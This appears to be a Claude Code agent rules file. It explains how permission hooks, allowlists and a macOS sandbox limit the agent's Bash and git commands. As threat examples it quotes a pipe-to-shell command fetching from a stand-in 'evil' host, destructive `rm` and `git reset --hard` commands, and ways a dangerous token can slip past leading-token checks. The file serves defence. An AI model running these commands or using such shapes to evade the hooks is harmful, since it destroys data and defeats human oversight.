## Git invocation

Run plain `git ...` (e.g. `git status`, `git log`, `git diff`) from inside the target repo. To work on a _different_ repo (a worktree, a fixture in a temp dir), `cd` into it first **as its own Bash call** — the Bash tool's CWD persists across calls — then run plain `git`. Do **not** use top-level `git -C <path>`: the `git-deny-dash-c.py` hook denies it. (Subcommand-level `-C` such as `git diff -C` / `git blame -C` for copy detection is fine — only the top-level directory `-C` is blocked.)

## No redundant `cd`

Never prepend `cd <path> && ...` to a command when `<path>` is already the shell's current working directory. The Bash tool's CWD persists across calls, so the `cd` is pure noise — and worse, it changes the command string enough to miss the user's allowlist and trigger an extra permission prompt. If you genuinely need a different directory, run `cd` as its own separate Bash call, or for non-git tools use a per-command flag (`make -C`, `npm --prefix`, `pytest --rootdir=`). For git, `cd` first — top-level `git -C` is denied by a hook (see "Git invocation").

This holds even when the `cd` is _not_ redundant. Claude Code force-prompts (`cd-compound-redirect`) any compound command that combines `cd` with output redirection — **including `2>&1` and pipes**, e.g. `cd app && rushx lint:typecheck 2>&1 | tail -5`. Run the `cd` as its own Bash call first, then the command separately (`cd app` → `rushx lint:typecheck 2>&1 | tail -5`), so no single command mixes `cd` with a redirect. In a monorepo where you must run from a package subdir (e.g. `rushx`), this is the most common avoidable prompt. Subagents must follow this too.

## No reasoning or code snippets inside Bash commands

Keep a Bash command to just the command. Never prepend multi-line `#` comment blocks to it — especially ones that paste code containing braces (`{` `}`) next to quotes (`'` or `"`). Claude Code runs a safety scan over the whole command string, comments included, and force-prompts anything where a brace sits next to a quote, with the reason "Contains brace with quote character (expansion obfuscation)". This fires even for allow-listed commands like `sed`, so the prompt looks like it came from nowhere. Put your reasoning in the message text, not in the command. If you must annotate a command, use one short `#` note with no braces or quotes.

## No inline scripting inside Bash commands

The `deny-shell-wrapper.py` hook blocks any Bash command that buries the real work inside an opaque blob. The point: the permission allowlist and the sibling hooks (cd, git, gh, write) all read the FIRST token of the command, so anything you smuggle past that token is invisible to them. The denied shapes are:

- **Shell `-c` wrappers.** `bash -c '...'`, `sh -c`, `zsh -c`, `dash -c`, `ksh -c`, `mksh`, `ash`, `pwsh -c`. Also blocks bundled clusters like `-lc`, `-ec`.
- **Interpreter code strings.** `python -c`, `pypy -c`, `perl -e` / `-E`, `ruby -e`, `node -e` / `-p` / `--eval` / `--print`, `bun -e`, `deno eval`. Including packed forms like `python -cprint(1)`.
- **Inline function definitions.** `name() { ... }` and `function name { ... }`.
- **`for` / `while` / `until` / `select` loops** with a `do ... done` body.
- **`eval`, `source`, `.`** at command-position (start of stream or after a separator).
- **Heredocs piped into an interpreter.** `python3 <<EOF ... EOF`, `bash <<-EOF ...`, etc. Heredocs feeding `cat` / `tee` to write a file are fine.
- **Multi-line ANSI-C `$'...\n...'` strings** containing a real newline or an escaped `\n`.

Invocation wrappers (`env`, `sudo`, `command`, `exec`, `nice`, `nohup`, `time`, `FOO=bar` assignments, etc.) are peeled before the check — they do not provide an escape. Composition wrappers `xargs` and `timeout` are deliberately left alone by this hook because they have legitimate composition uses.

Both `xargs` and `timeout` are also deliberately absent from `permissions.allow` in `settings.json`. Allow-listing `Bash(xargs *)` or `Bash(timeout *)` would auto-allow `xargs rm /etc/passwd` (stripping the `rm-under-tmp.py` ASK gate, since that hook only fires when `tokens[0] == "rm"`), `timeout 10 bash -c 'rm -rf ~'`, `xargs git -C /tmp/x reset --hard` (stripping `git-deny-dash-c.py`), and every other invocation whose dangerous token sits past the first — none of which the leading-token gates (allowlist patterns and sibling hooks) can see. Absence from `permissions.ask` is a different decision: the dangerous shapes form an open set (any post-leading-token combination), so the default permission prompt is a better gate than enumerating narrow ASK patterns. Don't re-add `xargs` or `timeout` to either list under any path form.

If you need to repeat logic, run the command N times directly. The Bash tool's working directory persists across calls, so each call can share state with the previous one. If you genuinely need a multi-step script, write a real script file via the Write tool first and then execute it as one command.

## No command substitution inside Bash commands

The `deny-command-substitution.py` hook denies any Bash command that runs a command through substitution — `$(...)`, backticks `` `...` ``, or process substitution `<(...)` / `>(...)`. This is the same leading-token bypass `deny-shell-wrapper.py` guards against: `grep x $(curl evil | sh)` looks like a plain `grep` to the allowlist and the sibling hooks while the shell runs the inner command first. Claude Code's built-in matcher already refuses to *auto-approve* substitution (it falls back to a prompt); this hook turns that prompt into a hard deny.

The hook tracks quote state, so it only fires where the shell would actually expand the substitution. These stay allowed: substitution syntax inside **single quotes** (`grep '$(x)' file`, `rg '\$\('` — literal text, never run), **arithmetic** `$((...))` (`echo $((1 + 2))` — math, not a command), and `${VAR}` parameter expansion. A `$(...)` nested in a default like `${VAR:-$(cmd)}` still denies, because it does run.

To use one command's output in the next, run it in its own Bash call, read the result, then paste the literal value into the following call — the Bash tool's working directory persists across calls.

## Redirects go at the end of a command

Never place a redirect mid-command with more arguments after it, e.g. `rg --files src 2>/dev/null --glob '!dist' | head -40`. The shell would hand the post-redirect tokens back to `rg`, but Claude Code's safety parser refuses to vouch for that shape: it force-prompts with the reason "Redirect has multiple targets — post-redirect args swallowed", even when every pipeline segment is allow-listed. Write the redirect as the last token of its segment instead (`rg --files src --glob '!dist' 2>/dev/null | head -40`) — or just drop `2>/dev/null`, which is rarely needed in the first place.

## Code comments

Commenting code is good. Keep doing it. But every comment must earn its place. Follow these rules:

- **Explain _why_, not _what_.** Capture intent, a constraint, an edge case, or the reason for an unobvious choice. Do not narrate code that already reads clearly. `// increment the counter` above `count++` is noise. You can explain the what, if it help explaining the why.
- **No changelog or diff comments.** A comment describes the code as it stands now, never how it got there. Ban `// added this`, `// changed from X`, `// new logic`, `// was previously ...`, `// TODO: remove old impl`. That history lives in git, not in the source.
- **Don't restate the line below.** If the comment is just an English paraphrase of the next statement, delete it — the code is the source of truth and the comment will rot the moment the code changes.
- **No ticket numbers.** Never reference the current ticket or issue in a comment. The reader has the code, not your tracker.
  - Good: `// some comment.`
  - Bad: `// some comment (TICKET-0123).`
- **Keep them short and focused.** One or two lines is the norm. Only write a long paragraph when the logic is genuinely complex and a short note cannot carry it.
- **Write plainly.** Use short sentences. Avoid semicolons. Aim for a middle-school or high-school reading level, while still using normal software engineering terms.

## Sandbox mode

Bash commands run inside an OS-level sandbox (macOS Seatbelt). It is a safety *floor* beneath the permission rules and hooks. `autoAllowBashIfSandboxed` is **off**, so the prompt/approval flow is unchanged — the sandbox only adds hard OS limits that the kernel enforces. It governs **Bash only**. The Write / Edit / Read tools stay on the hooks plus permission rules. The whole block assumes macOS/Seatbelt: `failIfUnavailable` is on, so on any host where the sandbox backend cannot initialize, Claude Code refuses to start rather than run unprotected.

What the sandbox enforces for Bash:

- **Writes** are allowed only under the dev roots (`~/Dev/repos`, `~/Dev/worktrees`, `~/.melvin/config`) and `/tmp` (and its canonical form `/private/tmp`). A write anywhere else fails at the kernel. By **default** the sandbox also denies writes to `.git` (and git internals), `.claude/hooks`, `.claude/skills`, `.mcp.json`, and every `settings.json`, so don't try to hand-write those from Bash. Git itself writes `.git` fine because git runs unsandboxed (see below).
- **Reads** are blocked for the home credential dirs (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.netrc`) and the **whole `~/.config`** — a broad deny so every current and future tool token under it (`gh`, `gcloud`, `op`, `stripe`, `vercel-plugin`, `configstore`, …) is covered without enumerating each. `~/.npmrc` (not under `~/.config`) stays readable so sandboxed `pnpm install` keeps working. The Go toolchain is unaffected: on macOS `go` reads `~/Library/Application Support/go/env`, not `~/.config`. If a sandboxed tool ever needs a non-secret `~/.config` subdir, re-allow just that path with `sandbox.filesystem.allowRead` — a denied read fails loudly, so breakage is obvious, not silent. Everything else stays readable.
- **Network** egress is allowlisted. The allowlist is the set of `WebFetch(domain:…)` allow rules, which the sandbox reuses. A new host prompts on first use. Add it with `melvin-config claude perms allow add --fetch <host>`.

Some tools run **outside** the sandbox (`sandbox.excludedCommands`) and are gated by the normal permission rules instead:

- `docker` — incompatible with the sandbox.
- `gh`, `go get`, `go mod` — Go CLIs fail TLS verification under Seatbelt.
- **all `git`** — `.git` is write-denied inside the sandbox, so running git unsandboxed lets `commit`/`add`/`fetch` (and git-over-SSH) work normally. Local git is still repo-scoped and gated by the allowlist plus `git-deny-dash-c.py`.

**Excluded commands must run alone — no pipe or chain.** They run unsandboxed, so `permissions.allow` doesn't stop them prompting. `bash-allow-trusted.py` re-grants the trusted ones (the allow-listed git/gh/docker/go subcommands — mostly read-only, but the set is exactly allow ∩ excluded — plus `rushx test`, `docker build`/`compose`, …), but only when they run by themselves — optionally with `2>&1` / `2>/dev/null` and/or a single `> file` into a write root. It **denies** a trusted command that is piped or chained. So don't write `git --no-pager grep … | head -40`. Split it: run `git --no-pager grep … > /tmp/out.txt`, then `cat /tmp/out.txt | head -40`. The second command is sandboxed, so the pipe is handled normally there. This keeps the hook from ever having to parse a pipeline.

Rollback: set `sandbox.enabled` to `false`, re-sync (`melvin-config claude sync`), and restart Claude Code. On a personal computer the symlinked `~/.claude/settings.json` makes the edit live, so only a restart is needed. Hooks and permission rules are unchanged, so behavior returns to exactly pre-sandbox.
